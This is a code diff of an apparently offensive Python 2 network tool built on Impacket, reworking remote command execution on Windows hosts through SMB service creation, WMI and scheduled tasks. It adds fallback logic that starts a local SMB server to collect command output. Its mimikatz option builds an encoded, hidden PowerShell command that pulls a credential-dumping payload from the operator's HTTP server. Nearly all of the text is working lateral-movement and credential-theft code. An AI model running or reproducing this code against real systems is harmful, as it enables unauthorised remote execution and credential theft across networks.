@@ -44,7 +44,7 @@ import string
 PERM_DIR = ''.join(random.sample(string.ascii_letters, 10))
 OUTPUT_FILENAME = ''.join(random.sample(string.ascii_letters, 10))
 BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
-SMBSERVER_DIR   = ''.join(random.sample(string.ascii_letters, 10))
+SMBSERVER_DIR   = 'served_over_smb'
 DUMMY_SHARE     = 'TMP'
 
 logging.basicConfig(format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
@@ -211,22 +211,14 @@ class SMBServer(Thread):
             exit('[!] Error: ** SMB Server must be run as root **')
         Thread.__init__(self)
 
-    def cleanup_server(self):
-        print '[*] Cleaning up..'
-        try:
-            os.unlink(SMBSERVER_DIR + '/smb.log')
-        except:
-            pass
-        os.rmdir(SMBSERVER_DIR)
-
     def run(self):
         # Here we write a mini config for the server
         smbConfig = ConfigParser.ConfigParser()
         smbConfig.add_section('global')
-        smbConfig.set('global','server_name','server_name')
-        smbConfig.set('global','server_os','UNIX')
+        smbConfig.set('global','server_name','yomama')
+        smbConfig.set('global','server_os','REDSTAR')
         smbConfig.set('global','server_domain','WORKGROUP')
-        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
+        smbConfig.set('global','log_file', 'smb.log')
         smbConfig.set('global','credentials_file','')
 
         # Let's add a dummy share
@@ -244,22 +236,14 @@ class SMBServer(Thread):
         smbConfig.set('IPC$','path')
 
         self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
-        print '[*] Creating tmp directory'
-        try:
-            os.mkdir(SMBSERVER_DIR)
-        except Exception, e:
-            print '[!]', e
-            pass
-        print '[*] Setting up SMB Server'
+
         self.smb.processConfigFile()
-        print '[*] Ready to listen...'
         try:
             self.smb.serve_forever()
         except:
             pass
 
     def stop(self):
-        self.cleanup_server()
         self.smb.socket.close()
         self.smb.server_close()
         self._Thread__stop()
@@ -1164,114 +1148,6 @@ class SAMRDump:
 
         return entries
 
-class RemoteShellsmbexec():
-    def __init__(self, share, rpc, mode, serviceName, command):
-        self.__share = share
-        self.__mode = mode
-        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
-        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
-        self.__outputBuffer = ''
-        self.__command = command
-        self.__shell = '%COMSPEC% /Q /c '
-        self.__serviceName = serviceName
-        self.__rpc = rpc
-        self.__scmr = rpc.get_dce_rpc()
-
-        try:
-            self.__scmr.connect()
-        except Exception as e:
-            print "[!] {}".format(e)
-            sys.exit(1)
-
-        s = rpc.get_smb_connection()
-
-        # We don't wanna deal with timeouts from now on.
-        s.setTimeout(100000)
-        if mode == 'SERVER':
-            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
-            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
-
-        try:
-            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
-            resp = scmr.hROpenSCManagerW(self.__scmr)
-            self.__scHandle = resp['lpScHandle']
-            self.transferClient = rpc.get_smb_connection()
-        except Exception as e:
-            print "[-] {}".format(e)
-
-    def set_copyback(self):
-        s = self.__rpc.get_smb_connection()
-        s.setTimeout(100000)
-        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
-        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
-
-    def finish(self):
-        # Just in case the service is still created
-        try:
-           self.__scmr = self.__rpc.get_dce_rpc()
-           self.__scmr.connect() 
-           self.__scmr.bind(svcctl.MSRPC_UUID_SVCCTL)
-           resp = scmr.hROpenSCManagerW(self.__scmr)
-           self.__scHandle = resp['lpScHandle']
-           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
-           service = resp['lpServiceHandle']
-           scmr.hRDeleteService(self.__scmr, service)
-           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
-           scmr.hRCloseServiceHandle(self.__scmr, service)
-        except Exception, e:
-           pass
-
-    def get_output(self):
-        def output_callback(data):
-            self.__outputBuffer += data
-
-        if self.__mode == 'SHARE':
-
-            while True:
-                try:
-                    self.transferClient.getFile(self.__share, self.__output, output_callback)
-                    break
-                except Exception, e:
-                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
-                        sleep(1)
-                        pass
-                    else:
-                        print str(e)
-                        pass 
-            self.transferClient.deleteFile(self.__share, self.__output)
-
-        else:
-            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
-            output_callback(fd.read())
-            fd.close()
-            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)
-
-    def execute_remote(self, data):
-        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
-        if self.__mode == 'SERVER':
-            command += ' & ' + self.__copyBack
-        command += ' & ' + 'del ' + self.__batchFile
-
-        try:
-            resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
-            service = resp['lpServiceHandle']
-        except:
-            return
-
-        try:
-           scmr.hRStartServiceW(self.__scmr, service)
-        except:
-           pass
-        scmr.hRDeleteService(self.__scmr, service)
-        scmr.hRCloseServiceHandle(self.__scmr, service)
-        self.get_output()
-
-    def send_data(self, data):
-        self.execute_remote(data)
-        result = self.__outputBuffer
-        self.__outputBuffer = ''
-        return result
-
 class TSCH_EXEC:
     def __init__(self, username='', password='', domain='', hashes=None, command=None):
         self.__username = username
@@ -1302,11 +1178,9 @@ class TSCH_EXEC:
         try:
             self.doStuff(rpctransport)
         except Exception, e:
-            #import traceback
-            #traceback.print_exc()
             logging.error(e)
             if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >=0:
-                logging.info('When STATUS_OBJECT_NAME_NOT_FOUND is received, try running again. It might work')
+                self.doStuff(rpctransport)
 
     def doStuff(self, rpctransport):
         def output_callback(data):
@@ -1417,12 +1291,118 @@ class TSCH_EXEC:
         self.__smbConnection.deleteFile('ADMIN$', 'Temp\\%s' % self.__tmpFileName)
         self.__dceConnection.disconnect()
 
+class RemoteShellsmbexec():
+    def __init__(self, share, rpc, mode, serviceName, command):
+        self.__share = share
+        self.__mode = mode
+        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
+        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
+        self.__outputBuffer = ''
+        self.__command = command
+        self.__shell = '%COMSPEC% /Q /c '
+        self.__serviceName = serviceName
+        self.__rpc = rpc
+        self.__scmr = rpc.get_dce_rpc()
+
+        try:
+            self.__scmr.connect()
+        except Exception as e:
+            print "[!] {}".format(e)
+            sys.exit(1)
+
+        s = rpc.get_smb_connection()
+
+        # We don't wanna deal with timeouts from now on.
+        s.setTimeout(100000)
+        if mode == 'SERVER':
+            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
+            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
+
+        try:
+            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
+            resp = scmr.hROpenSCManagerW(self.__scmr)
+            self.__scHandle = resp['lpScHandle']
+            self.transferClient = rpc.get_smb_connection()
+        except Exception as e:
+            print "[-] {}".format(e)
+
+    def set_copyback(self):
+        s = self.__rpc.get_smb_connection()
+        s.setTimeout(100000)
+        myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
+        self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)
+
+    def finish(self):
+        # Just in case the service is still created
+        try:
+           self.__scmr = self.__rpc.get_dce_rpc()
+           self.__scmr.connect() 
+           self.__scmr.bind(svcctl.MSRPC_UUID_SVCCTL)
+           resp = scmr.hROpenSCManagerW(self.__scmr)
+           self.__scHandle = resp['lpScHandle']
+           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
+           service = resp['lpServiceHandle']
+           scmr.hRDeleteService(self.__scmr, service)
+           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
+           scmr.hRCloseServiceHandle(self.__scmr, service)
+        except Exception, e:
+           pass
+
+    def get_output(self):
+        def output_callback(data):
+            self.__outputBuffer += data
+
+        if self.__mode == 'SHARE':
+            while True:
+                try:
+                    self.transferClient.getFile(self.__share, self.__output, output_callback)
+                    break
+                except Exception, e:
+                    if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
+                        sleep(1)
+                        pass
+                    else:
+                        logging.info('Error while reading command output: {}'.format(e))
+                        raise SessionError
+            
+            self.transferClient.deleteFile(self.__share, self.__output)
+
+        elif self.__mode == 'SERVER':
+            with open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r') as fd:
+                output_callback(fd.read())
+            #self.transferClient.deleteFile(self.__share, self.__output)
+
+    def execute_remote(self, data):
+        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
+        if self.__mode == 'SERVER':
+            command += ' & ' + self.__copyBack
+        command += ' & ' + 'del ' + self.__batchFile
+
+        try:
+            resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
+            service = resp['lpServiceHandle']
+        except:
+            return
+
+        try:
+           scmr.hRStartServiceW(self.__scmr, service)
+        except:
+           pass
+        scmr.hRDeleteService(self.__scmr, service)
+        scmr.hRCloseServiceHandle(self.__scmr, service)
+        self.get_output()
+
+    def send_data(self, data):
+        self.execute_remote(data)
+        result = self.__outputBuffer
+        self.__outputBuffer = ''
+        return result
+
 class CMDEXEC:
     KNOWN_PROTOCOLS = {
         '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
         '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
         }
-
 
     def __init__(self, protocols = None,  username = '', password = '', domain = '', hashes = '', share = None, command= None):
         if not protocols:
@@ -1471,17 +1451,16 @@ class CMDEXEC:
             except SessionError as e:
                 if 'STATUS_SHARING_VIOLATION' in str(e):
                     return
-                else:
-                    print "[-] {}".format(e)
 
-                #self.__mode = 'SERVER'
-                #serverThread = SMBServer()
-                #serverThread.daemon = True
-                #serverThread.start()
-                #self.shell = RemoteShellsmbexec(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
-                #self.shell.set_copyback()
-                #result = self.shell.send_data(self.__command)
-                #serverThread.stop()
+                logging.info('Starting SMB Server')
+                smb_server = SMBServer()
+                smb_server.daemon = True
+                smb_server.start()
+                self.__mode = 'SERVER'
+                self.shell = RemoteShellsmbexec(self.__share, rpctransport, self.__mode, self.__serviceName, self.__command)
+                self.shell.set_copyback()
+                result = self.shell.send_data(self.__command)
+                smb_server.stop()
 
             except  (Exception, KeyboardInterrupt), e:
                 traceback.print_exc()
@@ -1491,8 +1470,75 @@ class CMDEXEC:
 
         return result
 
+class RemoteShellwmi():
+    def __init__(self, share, win32Process, smbConnection, mode, noOutput=False):
+        self.__share = share
+        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
+        self.__outputBuffer = ''
+        self.__shell = 'cmd.exe /Q /c '
+        self.__win32Process = win32Process
+        self.__transferClient = smbConnection
+        self.__pwd = 'C:\\'
+        self.__noOutput = noOutput
+        self.__mode = mode
+
+        # We don't wanna deal with timeouts from now on.
+        self.__transferClient.setTimeout(100000)
+        self.__myIPaddr = self.__transferClient.getSMBServer().get_socket().getsockname()[0]
+
+    def get_output(self):
+        def output_callback(data):
+            self.__outputBuffer += data
+
+        if self.__noOutput is True:
+            self.__outputBuffer = ''
+            return
+
+        if self.__mode == 'SHARE':
+            while True:
+                try:
+                    self.__transferClient.getFile(self.__share, self.__output, output_callback)
+                    break
+                except Exception, e:
+                    if "STATUS_SHARING_VIOLATION" in str(e):
+                        sleep(1)
+                        pass
+                    else:
+                        logging.info('Error while reading command output: {}'.format(e))
+                        raise SessionError
+            
+            self.__transferClient.deleteFile(self.__share, self.__output)
+
+        elif self.__mode == 'SERVER':
+            wait = 0
+            while wait < 5:
+                try:
+                    with open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r') as fd:
+                        output_callback(fd.read())
+                    break
+                except IOError:
+                    sleep(1)
+                    wait += 1
+
+    def execute_remote(self, data):
+        command = self.__shell + data
+        if self.__noOutput is False:
+            if self.__mode == 'SERVER':
+                command += ' 1> ' + '\\\\{}\\{}\\{}'.format(self.__myIPaddr, DUMMY_SHARE, OUTPUT_FILENAME)  + ' 2>&1'
+            elif self.__mode == 'SHARE':
+                command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
+
+        obj = self.__win32Process.Create(command, self.__pwd, None)
+        self.get_output()
+
+    def send_data(self, data):
+        self.execute_remote(data)
+        result = self.__outputBuffer
+        self.__outputBuffer = ''
+        return result
+
 class WMIEXEC:
-    def __init__(self, command = '', username = '', password = '', domain = '', hashes = '', share = None, noOutput=True):
+    def __init__(self, command = '', username = '', password = '', domain = '', hashes = '', share = None, noOutput=False):
         self.__command = command
         self.__username = username
         self.__password = password
@@ -1503,6 +1549,7 @@ class WMIEXEC:
         self.__share = share
         self.__noOutput = noOutput
         self.__doKerberos = False
+        self.__mode = "SHARE"
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -1517,65 +1564,20 @@ class WMIEXEC:
         win32Process,_ = iWbemServices.GetObject('Win32_Process')
 
         try:
-            self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection)
+            self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection, self.__mode, self.__noOutput)
             result = self.shell.send_data(self.__command)
-        except  (Exception, KeyboardInterrupt), e:
-            traceback.print_exc()
-            dcom.disconnect()
-            sys.stdout.flush()
+        except SessionError as e:
+            logging.info('Starting SMB Server')
+            smb_server = SMBServer()
+            smb_server.daemon = True
+            smb_server.start()
+            self.__mode = 'SERVER'
+            self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection, self.__mode, self.__noOutput)
+            result = self.shell.send_data(self.__command)
+            smb_server.stop()
 
         dcom.disconnect()
 
-        return result
-
-class RemoteShellwmi():
-    def __init__(self, share, win32Process, smbConnection):
-        self.__share = share
-        self.__output = '\\' + OUTPUT_FILENAME 
-        self.__outputBuffer = ''
-        self.__shell = 'cmd.exe /Q /c '
-        self.__win32Process = win32Process
-        self.__transferClient = smbConnection
-        self.__pwd = 'C:\\'
-        self.__noOutput = False
-
-        # We don't wanna deal with timeouts from now on.
-        if self.__transferClient is not None:
-            self.__transferClient.setTimeout(100000)
-        else:
-            self.__noOutput = True
-
-    def get_output(self):
-        def output_callback(data):
-            self.__outputBuffer += data
-
-        if self.__noOutput is True:
-            self.__outputBuffer = ''
-            return
-
-        while True:
-            try:
-                self.__transferClient.getFile(self.__share, self.__output, output_callback)
-                break
-            except Exception, e:
-                if "STATUS_SHARING_VIOLATION" in str(e):
-                    sleep(1)
-                    pass
-                else:
-                    pass
-        self.__transferClient.deleteFile(self.__share, self.__output)
-
-    def execute_remote(self, data):
-        command = self.__shell + data
-        if self.__noOutput is False:
-            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
-        obj = self.__win32Process.Create(command, self.__pwd, None)
-        self.get_output()
-
-    def send_data(self, data):
-        self.execute_remote(data)
-        result = self.__outputBuffer
-        self.__outputBuffer = ''
         return result
 
 class RPCENUM():
@@ -1690,6 +1692,7 @@ def ps_command(command=None, katz_ip=None):
 
 def connect(host):
     try:
+
         smb = SMBConnection(host, host, None, args.port)
         try:
             smb.login('' , '')
@@ -1708,6 +1711,7 @@ def connect(host):
         if args.hash:
             lmhash, nthash = args.hash.split(':')
 
+        noOutput = False
         smb.login(args.user, args.passwd, domain, lmhash, nthash)
 
         if args.download:
@@ -1770,7 +1774,9 @@ def connect(host):
             print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
 
         if args.mimikatz:
-            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=args.local_ip))
+            noOutput = True
+            local_ip = smb.getSMBServer().get_socket().getsockname()[0]
+            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=local_ip))
 
         if args.pscommand:
             args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
@@ -1778,9 +1784,9 @@ def connect(host):
         if args.command:
 
             if args.execm == 'wmi':
-                executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share)
+                executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
                 result = executer.run(host, smb)
-                if not args.mimikatz:
+                if result:
                     print '[+] {}:{} {} Executed specified command via WMI:'.format(host, args.port, domain)
                     print result
 
@@ -1830,7 +1836,7 @@ def concurrency(hosts):
         joinall(jobs)
     except KeyboardInterrupt:
         print "[!] Got CTRL-C! Exiting.."
-        sys.exit(0)
+        sys.exit()
 
 if __name__ == '__main__':
 
@@ -1852,7 +1858,6 @@ if __name__ == '__main__':
     parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
     parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
     parser.add_argument("-t", default=10, type=int, dest="threads", help="Set how many concurrent threads to use")
-    parser.add_argument("-l", type=str, dest='local_ip', help='Local IP address')
     parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
     rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
@@ -1866,7 +1871,7 @@ if __name__ == '__main__':
     egroup.add_argument("--lusers", action='store_true', dest='enum_lusers', help='Enumerate logged on users')
 
     cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
-    cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
+    cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
     cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
 
@@ -1887,10 +1892,7 @@ if __name__ == '__main__':
         args.upload[1] = normalize_path(args.upload[1])
 
     if args.mimikatz:
-        if not args.local_ip:
-            print '[-] You must specify your local IP with \'-l\''
-            sys.exit()
-
+        print "[*] Press CTRL-C at any time to exit"
         print '[*] Note: This might take some time on large networks! Go grab a redbull!\n'
         server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
         t = Thread(name='HTTPServer', target=server.serve_forever)
@@ -1898,3 +1900,10 @@ if __name__ == '__main__':
         t.start()
 
     concurrency(hosts)
+
+    if args.mimikatz:
+        try:
+            while True:
+                sleep(1)
+        except KeyboardInterrupt:
+            sys.exit()
